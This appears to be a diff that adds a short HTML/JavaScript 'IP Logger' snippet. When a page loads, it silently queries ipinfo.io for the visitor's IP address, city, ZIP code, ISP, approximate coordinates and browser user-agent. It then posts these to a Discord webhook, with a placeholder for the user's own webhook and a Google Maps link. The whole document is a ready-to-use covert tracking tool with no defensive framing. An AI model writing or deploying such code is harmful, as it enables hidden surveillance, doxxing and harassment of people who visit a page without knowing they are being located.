@@ -1,0 +1,15 @@
+<script>
+function snake(json) {
+    var request = new XMLHttpRequest();
+    request.open("POST", "Put your Discord Webhook Here !!");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+        username: "IP Logger", content: "@everyone", embeds: [{
+            title: "Someone visited the IP grabber!", color: 1752220, description: `**IP:** \`${json.ip}\`\n**Country:** \`${json.country}\`\n**Region:** \`${json.region}\`\n**City:** \`${json.city}\`\n**ZIP:** \`${json.postal}\`\n**Timezone:** \`${json.timezone}\`\n**ISP:** \`${json.org}\`\n**Coordinates (approx):** \`${json.loc}\`\n**User-Agent:** \`${navigator.userAgent}\`\n**Timestamp:** \`${new Date().toISOString()}\`\n**Coords on Map (approx):** [View on Google Maps](https://www.google.com/maps?q=${json.loc})`,
+            footer: { text: "Logged by IP Logger" }
+        }]
+    };
+    request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=snake"></script>
